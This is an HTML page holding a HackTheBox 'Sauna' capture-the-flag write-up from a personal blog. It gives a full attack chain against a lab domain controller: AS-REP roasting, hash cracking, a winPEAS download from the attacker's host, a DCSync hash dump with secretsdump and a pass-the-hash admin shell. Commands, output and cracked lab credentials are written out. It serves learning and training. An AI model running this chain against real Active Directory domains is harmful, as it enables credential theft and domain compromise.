@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<title>HackTheBox - Sauna | Active Denial System</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Summary Sauna was a great box for learning some Active Directory recon and attacks through the use of impacket tooling. It involved using ASREPRoast and crac...">
+<meta name="author" content="wittr">
+<meta name="generator" content="Jekyll v4.1.1">
+<link rel="canonical" href="http://localhost:4000/writeups/2020/07/16/HTB-Sauna.html">
+
+<link rel="stylesheet" href="/assets/css/index.css">
+
+<link rel="stylesheet" href="/assets/css/classes.css">
+
+<link rel="alternate" href="/feed.xml" type="application/atom+xml" title="Active Denial System">
+
+
+
+
+<header class="icons">
+  
+    <a href="/" class="title">Active Denial System</a>
+  
+  
+    
+  <nav>
+  <a aria-label="Home" href="/" ><span aria-hidden="true" >Home</span></a>
+  <a aria-label="About" href="/about/" ><span aria-hidden="true" >About</span></a>
+  <a aria-label="Subjects" href="/subjects/" ><span aria-hidden="true" >Subjects</span></a>
+  <a aria-label="Archive" href="/archive/" ><span aria-hidden="true" >Archive</span></a>
+  
+  </nav>
+
+
+    
+  <nav>
+  <a aria-label="Twitter" href="https://twitter.com/rivenlogik" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#twitter"></use></svg></a>
+  <a aria-label="Github" href="https://github.com/rivenlogik" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#github"></use></svg></a>
+  <a aria-label="HackTheBox" href="https://www.hackthebox.eu/home/users/profile/33864" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#cube"></use></svg></a>
+  <a aria-label="Subscribe" href="/feed.xml" ><svg aria-hidden="true" ><use xlink:href="/assets/fontawesome/icons.svg#rss"></use></svg></a>
+  
+  </nav>
+
+
+  
+  
+</header>
+
+<article>
+  <header>
+  
+  <div class="categories">
+    
+    FILED UNDER:
+    
+    <a href="/subjects/#writeups">WRITEUPS</a>
+    
+    
+  </div>
+  
+  <h1><a href="/writeups/2020/07/16/HTB-Sauna.html">HackTheBox - Sauna</a></h1><time datetime="2020-07-16T22:56:57-05:00">July 16, 2020</time>
+</header>
+
+  <p><img src="/assets/images/HTBoxes/Sauna/Sauna.png" alt="Sauna" /></p>
+
+<h2 id="summary">Summary</h2>
+
+<p>Sauna was a great box for learning some Active Directory recon and attacks through the use of impacket tooling.  It involved using <a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx">ASREPRoast</a> and cracking a hash to gain a foothold with a tool like evil-winrm, followed by enumeration of bad domain permissions to escalate privileges via a <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync">DCSync Attack</a>.</p>
+
+<h2 id="walkthrough">Walkthrough</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Starting with nmap as always: <code class="language-plaintext highlighter-rouge">nmap -A -T4 -v 10.10.10.175</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    <span class="nb">bind
+</span>80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-06-17 08:32:14Z<span class="o">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp open  tcpwrapped
+</code></pre></div></div>
+
+<p>Based off this nmap, it is pretty clear to see it seems to be a domain controller with ports like 53 (DNS), 88 (Kerberos), etc. open.</p>
+
+<p>I decided to checkout the website it is hosting.</p>
+
+<p><img src="/assets/images/HTBoxes/Sauna/sauna-website.png" alt="Sauna Website" /></p>
+
+<p>I poked around for awhile, it was basically a bank site.  I generally didn’t know what to pursue next so I went to the forums for clues.  I had not used impacket tooling much at this point, and it looked like some of their scripts was where to go next.</p>
+
+<p>I ended up playing with <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> from impacket and learning its parameters and how it can be used for <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">ASREPRoast</a>.</p>
+
+<p>The user that worked was “fsmith” (a guess based off common username nomenclature) which basically was “Fergus Smith” from the “Meet the Team” section of the website.  So I ran the <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python GetNPUsers.py egotistical-bank.local/fsmith <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.10.10.175
+
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>fsmith
+<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:ffc4a4278df19115d39740cd03e9db57<span class="nv">$a0425a79f8c405a2d4707123842038f135fe400c37d4d774b6dd3d2d9ecaa32b7621bc9a8784d9e77db5c9bc919905025b4bfddc4da93c6bcdcddef1a8208831dbc64ac6bb380288b7cb67f9c2000d74bdd80a7c5c80b99f3706568c1e615a8e6c762d95e7e212c1f3c362a9e076c9ce50e3ae634e8657d7c79188ab74598361a14c08522e8d5367324c1832305ffc6f3e923f32e2d86b4a812978c9eb30c2b6ca02632730b603bb16863f0b490e8a74bc2045dedd90148691919aeab2f6459d09dfc2a1085f849a93ad610ce83bdbb26988145e8c64f64c96632585186e712d500055c2328f0d2325b751f3e1885cd43a49bb006f64922d17865aaf6e09128b</span>
+</code></pre></div></div>
+
+<p>With this hash I ran it through John the ripper and used the usual rockyou.txt to see if I get a hit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt fsmith-hash.txt
+
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Thestrokes23     <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:36 DONE <span class="o">(</span>2020-07-15 23:22<span class="o">)</span> 0.02755g/s 290401p/s 290401c/s 290401C/s ThetaNuTheta..Thessa1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<h3 id="foothold">Foothold</h3>
+
+<p>Alright, now I’m getting somewhere! I decided to try the enum4linux script that comes with Kali since I had a username and password. However, it didn’t really point me at anything in particular and I didn’t keep it in my notes to post here.</p>
+
+<p>I eventually figured out that I could get a shell using <code class="language-plaintext highlighter-rouge">evil-winrm</code> which is a great tool.  I fired up a shell using the command <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23</code></p>
+
+<h3 id="user">User</h3>
+
+<p>Looking at the Desktop directory real quick I was able to grab the flag. I didn’t have to move laterally as fsmith was the user to own here.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\FSmith\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+
+
+    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\Users\FSmith\desktop</span><span class="w">
+
+
+</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
+</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">1</span><span class="nf">/23/2020</span><span class="w">  </span><span class="nx">10:03</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\FSmith\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="mi">1</span><span class="nf">b55</span><span class="w"> </span><span class="o">...</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="root">Root</h3>
+
+<p>Onto root we go, I enumerated using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a>.</p>
+
+<p>First I had to get it on the system: <code class="language-plaintext highlighter-rouge">Invoke-WebRequest -Uri http://&lt;myip&gt;:8080/winPEAS.exe -OutFile winpeas.exe</code></p>
+
+<p>It has a good amount of output, but something sure stood out!</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">Looking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">AutoLogon</span><span class="w"> </span><span class="nx">credentials</span><span class="p">(</span><span class="nf">T1012</span><span class="p">)</span><span class="w">
+    </span><span class="nf">Some</span><span class="w"> </span><span class="nx">AutoLogon</span><span class="w"> </span><span class="nx">credentials</span><span class="w"> </span><span class="nx">were</span><span class="w"> </span><span class="nx">found</span><span class="o">!!</span><span class="w">
+    </span><span class="nf">DefaultDomainName</span><span class="w">             </span><span class="p">:</span><span class="w">  </span><span class="nx">EGOTISTICALBANK</span><span class="w">
+    </span><span class="nf">DefaultUserName</span><span class="w">               </span><span class="p">:</span><span class="w">  </span><span class="nx">EGOTISTICALBANK\svc_loanmanager</span><span class="w">
+    </span><span class="nf">DefaultPassword</span><span class="w">               </span><span class="p">:</span><span class="w">  </span><span class="nx">Moneymakestheworldgoround</span><span class="o">!</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I now had another set of credentials, but I wasn’t sure what to do with them.  I did some more enumeration.  Eventually after getting a hint from the forums (I’m pretty bad at knowing what to enumerate for now, but I’m certain that will change as I learn more about what to look for..), I realized I could dump passwords using impacket again because of excessive permissions given to the <em>svc_loanmgr</em> account.  So that is what I did.</p>
+
+<p>But before we get to that, I went back after owning root and did some reading on what I should of found in order to understand why <code class="language-plaintext highlighter-rouge">secretsdump.py</code> works.  I did some enumeration on the service account and found the excessive permissions (I was <em>svc_loanmgr</em> in the screenshot but it works as <em>fsmith</em> user too):</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Import-module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w">
+</span><span class="p">(</span><span class="nf">Get-Acl</span><span class="w"> </span><span class="s2">"ad:\dc=egotistical-bank,dc=local"</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'svc_loanmgr'</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectType</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectType</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectType</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"89e95b76-444d-4c62-991a-0facbeda640c"</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/HTBoxes/Sauna/dcsync-permissions.png" alt="DCSync-permissions" /></p>
+
+<p>The service account has the permissions to replicate DC changes thus allowing for a DCSync attack.  Therefore, the <code class="language-plaintext highlighter-rouge">secretsdump.py</code> tool is able to dump hashes from the domain controller.</p>
+
+<p>I dumped the hashes via impacket’s secretsdump tool:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py egotistical-bank.local/svc_loanmgr:<span class="s2">"Moneymakestheworldgoround!"</span>@10.10.10.175 <span class="nt">-dc-ip</span> 10.10.10.175
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+&lt;<span class="nt">--Snipped--</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Finally, with the hash available I used evil-winrm to pass the hash to get an admininstrative shell on the box.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.10.175</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">d9485863c1e9e05851aa40cbb4ab9dff</span><span class="w">
+
+</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.3</span><span class="w">
+
+</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">
+
+</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="nf">egotisticalbank\administrator</span><span class="w">
+</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="lessons-learned">Lessons Learned</h3>
+
+<p>This box was very fun and many firsts for me when it comes to new tools.</p>
+
+<p>Some of the things I learned with this box:</p>
+
+<ul>
+  <li>How a DC Sync can happen with improper domain level permissions</li>
+  <li>Some of the static GUIDs that roles have within a domain.</li>
+  <li>The tool Evil-WinRM which was easy to use.</li>
+  <li>Attacking a domain controller using impacket tools.</li>
+</ul>
+
+  
+</article>
+
+
+  <footer class="related">
+    <div class="previous"><span>Previous Post</span><a href="/tools/2020/07/14/Terraform-notes.html">Terraform Notes</a></div>
+    <div class="next"></div>
+  </footer>
+
+
+
+</html>
